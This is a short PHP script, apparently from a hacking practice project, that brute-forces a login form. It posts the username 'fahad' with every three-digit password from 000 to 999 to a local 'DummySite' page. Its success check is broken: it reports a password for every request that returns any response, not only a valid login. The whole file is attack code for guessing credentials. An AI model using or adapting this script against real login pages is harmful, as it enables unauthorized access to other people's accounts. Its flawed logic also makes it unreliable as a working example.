<?php
		$ch = curl_init();

		
		$username = 'fahad';

		curl_setopt($ch, CURLOPT_URL, 'http://localhost/Hackalgo/DummySite/index.php');

		curl_setopt($ch, CURLOPT_POST, 1);

		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

		curl_setopt($ch, CURLOPT_HEADER, 0);

		
		for($a=0; $a<=9; $a++){
			for($b=0; $b<=9; $b++){
				for($c=0; $c<=9; $c++){

					$password = $a."".$b."".$c;

					$options = array(
						'username' => $username,
						'password' => $password
					);

					curl_setopt($ch, CURLOPT_POSTFIELDS, $options);

					$output = curl_exec($ch);

					if($output != false) {
						echo "Password : ".$password."<br />";
					}
					else {
						echo "Failed to crawl<br />";
					}
				}	
			}
		}

			curl_close($ch);


?>